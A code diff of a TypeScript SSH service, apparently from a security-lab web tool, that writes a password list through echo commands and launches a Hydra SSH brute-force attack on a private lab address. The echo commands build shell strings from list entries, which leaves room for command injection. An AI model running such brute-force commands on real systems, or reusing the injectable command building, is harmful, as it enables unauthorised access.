@@ -54,8 +54,8 @@ export class ApiSshService {
     });
   }*/
 
-  connectSsh(ip, user, password) {
-    this.socket.emit('connectSSH', {ip: ip, user: user, password: password});
+  connectSsh(ip, user, password){
+    this.socket.emit('connectSSH', {ip: ip, user : user, password : password});
   }
 
   disconnectSsh() {
@@ -67,7 +67,7 @@ export class ApiSshService {
      this.socket.on('shellexecanswer', function (data) {
        if(data === undefined){
          console.log('undefined data :(');
-       }else
+       }else {
          console.log(data);
        }
      })
@@ -82,14 +82,14 @@ export class ApiSshService {
   writePasswordFile(tab) {
     for (let i = 0; i < tab.length; i++) {
       if (i === 0) {
-        this.socket.emit('command', 'echo ' + tab[i] + ' > password.txt\r');
+        this.socket.emit('command', 'echo "' + tab[i] + '" > password.txt\r');
       } else {
-        this.socket.emit('command', 'echo ' + tab[i] + ' >> password.txt\r');
+        this.socket.emit('command', 'echo "' + tab[i] + '" >> password.txt\r');
       }
     }
   }
 
   runBruteForceAttack() {
-    this.socket.emit('command', 'hydra -L username.txt -P password.txt 192.168.56.102 -t 4 ssh\r');
+    this.socket.emit('command', 'hydra -V -L username.txt -P password.txt 192.168.56.102 -t 4 ssh\r');
   }
 }
